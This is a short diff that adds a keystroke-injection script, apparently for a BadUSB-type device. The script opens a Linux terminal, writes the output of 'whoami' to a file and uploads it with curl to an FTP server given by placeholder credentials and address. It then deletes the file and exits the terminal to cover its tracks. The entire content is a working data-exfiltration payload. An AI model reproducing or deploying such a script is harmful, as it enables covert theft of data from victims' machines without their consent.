@@ -1,0 +1,10 @@
+Delay 1000
+RunUnix gnome-terminal
+Delay 3000
+PrintLine export xfile='LinuxUser.txt'; export ftpuser='USERNAME'; export ftppass='PASSWORD'; data="$(whoami)"; echo ${data}>${xfile}; export xip='IPSERVERFTP'
+Delay 3000
+PrintLine curl -T ${xfile} ftp://${ftpuser}:${ftppass}@${xip}/${xfile}
+Delay 7000
+PrintLine rm LinuxUser.txt
+Delay 2000
+PrintLine exit
